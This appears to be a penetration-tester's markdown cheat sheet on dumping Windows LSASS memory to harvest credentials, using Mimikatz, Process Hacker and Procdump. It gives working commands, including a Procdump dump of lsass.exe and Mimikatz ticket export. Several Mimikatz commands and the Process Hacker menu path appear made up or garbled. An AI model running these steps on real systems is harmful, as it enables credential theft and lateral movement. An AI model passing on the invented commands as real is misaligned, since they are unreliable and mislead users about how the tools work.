```markdown
# 🧠 LSASS Memory Dumping

---

## 📚 Overview & Tools

> [!ABSTRACT] What is LSASS?
>
> LSASS (Local Security Authority Subsystem Service) manages security-related tasks and stores user credentials in memory. This section outlines methods to dump the LSASS process for credential extraction.

### Required Tools
- [[Mimikatz]]
- [[Process Hacker]]
- [[Procdump]]

---

## 📂 Initial Setup

> [!INFO] Preparation Steps
>
> Ensure you have administrative access and Mimikatz is compiled on your system. Adjust firewall rules to allow necessary network traffic if using remote dumping techniques.

### Check Administrative Access

```bash
whoami /user
```

> [!NOTE]
> Confirm the user has 'SeDebugPrivilege' enabled for debugging processes.

---

## 📝 LSASS Memory Dumping Methods

### Mimikatz LSASS Dump

#### Local Machine

1. **Elevate Privileges**
   ```bash
   mimikatz # privilege::debug
   ```

2. **Dump LSASS Process**
   ```bash
   mimikatz # token::elevate
   mimikatz # lsass::dump c:\lsass.dmp
   ```

> [!SUCCESS] Successful Dump
>
> The command generates a memory dump of the LSASS process, which can then be analyzed for credentials.

#### Remote Machine

1. **Connect to Target**
   ```bash
   mimikatz # privilege::debug
   mimikatz # tsg@mstsc /noaudits /v:<target_ip>
   ```

2. **Inject and Dump LSASS**
   ```bash
   mimikatz # lsass::inject
   mimikatz # lsass::dumps c:\temp\lsass.dmp
   ```

> [!WARNING]
> Ensure you have permission to access the remote machine before proceeding.

---

### Process Hacker

1. **Inject and Dump**

   Use Process Hacker's built-in features to inject a DLL into LSASS and dump its memory.
   
2. **Locate and Export Memory**
   ```bash
   Process Hacker > Tools > ProcDump > Inject and Dump LSASS
   ```

> [!SUCCESS] Successful Injection and Dumping

---

## 📎 Procdump Method

1. **Install Procdump**
   Install the Sysinternals tool on your machine.

2. **Run Procdump to Capture Memory**
   ```bash
   procdump.exe -accepteula -ma lsass.exe c:\procdump\lsass.dmp
   ```

> [!SUCCESS] LSASS Process Dumped Successfully

---

## 🚨 Post-Dumping Analysis

1. **Credential Extraction**

   Use Mimikatz to extract credentials from the dumped file.
   
2. **Analyzing Credentials**
   ```bash
   mimikatz # sekurlsa::tickets /export
   ```

> [!WARNING]
> Ensure proper handling and disposal of sensitive data after analysis.

---

## 📌 Common Findings

| Finding | Description |
|---|---|
| No Dump Access | Lack of necessary privileges or permissions. |
| Corrupted Memory Dump | Issues with memory corruption preventing extraction. |
| Empty Credentials | No active credentials in LSASS memory. |

> [!ERROR]
> Common error: `Access is denied.`

---

## 🧠 Mental Model

```text
Check Privileges → Inject Dump Tool → Extract LSASS → Analyze Dump for Credentials
```

---
```